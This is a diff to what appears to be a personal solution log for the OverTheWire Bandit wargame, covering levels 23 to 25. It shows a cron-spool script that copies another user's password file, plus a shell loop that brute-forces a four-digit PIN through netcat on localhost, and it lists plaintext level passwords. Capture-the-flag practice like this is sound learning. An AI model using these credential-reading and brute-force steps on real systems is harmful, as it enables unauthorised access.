@@ -126,3 +126,8 @@ cat /etc/bandit_pass/bandit24 > /tmp/tmp23/output
 chmod 777 ./output
 cp ./script.sh /var/spool/bandit24/foo/script.sh
 VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+Level24->Level25
+for i in $(seq -f "%04g" 0 9999); do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> ./output; done;
+cat ./output | nc localhost 30002
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
